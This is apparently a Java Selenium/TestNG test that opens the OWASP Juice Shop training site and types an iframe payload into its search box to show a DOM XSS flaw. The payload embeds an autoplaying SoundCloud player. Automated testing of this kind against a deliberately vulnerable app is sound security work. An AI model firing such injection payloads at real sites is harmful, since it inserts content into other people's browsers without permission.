import org.openqa.selenium.WebDriver;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;
import pageObjectModel.HomePagePO;
import pageObjectModel.LoginPO;
import setup.DriverManager;
import setup.Waiter;

public class bonusPayloadTest extends DriverManager {

    private HomePagePO homePagePO;
    private WebDriver driver;


    @BeforeMethod
    //Method to set up driver and instantiate page object instances before every test
    public void setUp() {
        driver = getDriver();
        homePagePO = new HomePagePO(driver);
        LoginPO loginPO = new LoginPO(driver);
    }

    // Test that search is exploitable by inserting an iframe and play some nice tunes
    @Test
    public void domXSSAttackTest() {
        driver.get("https://juice-shop.herokuapp.com/#/");
        homePagePO.dismissPopup();
        homePagePO.searchFunction("<iframe width='100%' height='166' scrolling='no' frameborder='no' " +
                "id='bonus_payload' allow='autoplay'"  +
                "src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/" +
                "771984076&color=%23ff5500&auto_play=true" +
                "&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true'></iframe>");
        Waiter.waitUntilElementIsVisible(driver, homePagePO.getBonusPayload(), 5);
        System.out.println("Iframe has been successfully inserted.");
    }
}
